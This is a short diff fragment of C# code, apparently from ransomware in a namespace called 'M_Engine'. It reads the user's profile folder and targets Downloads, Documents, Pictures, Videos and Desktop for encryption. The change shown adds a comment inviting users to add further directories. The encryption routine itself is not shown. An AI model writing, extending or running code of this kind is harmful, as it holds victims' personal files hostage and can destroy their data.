@@ -31,7 +31,7 @@ namespace M_Engine
             }
 
             string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-            string[] foldersToEncrypt = { "Downloads", "Documents", "Pictures", "Videos", "Desktop" };
+            string[] foldersToEncrypt = { "Downloads", "Documents", "Pictures", "Videos", "Desktop" }; // u Can add custom dirs 
 
             foreach (string folder in foldersToEncrypt)
             {
